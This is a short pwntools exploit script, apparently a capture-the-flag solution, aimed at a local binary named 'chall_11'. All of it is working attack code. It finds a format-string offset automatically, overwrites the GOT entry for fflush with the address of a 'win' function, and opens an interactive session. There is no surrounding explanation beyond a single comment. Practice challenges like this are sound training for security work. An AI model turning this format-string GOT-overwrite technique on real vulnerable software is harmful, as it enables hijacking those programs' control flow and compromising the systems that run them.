from pwn import *
binary = "./chall_11"

def exec_fmt(payload):
    p = process(binary)
    p.sendline()
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(
    exec_fmt
)  #we're passing a function as the argument, they will use the function until they find offset

elf = ELF(binary)
p = process(binary)
p.sendline()
p.sendline(fmtstr_payload(autofmt.offset, {elf.got.fflush: elf.sym.win}))
p.interactive()
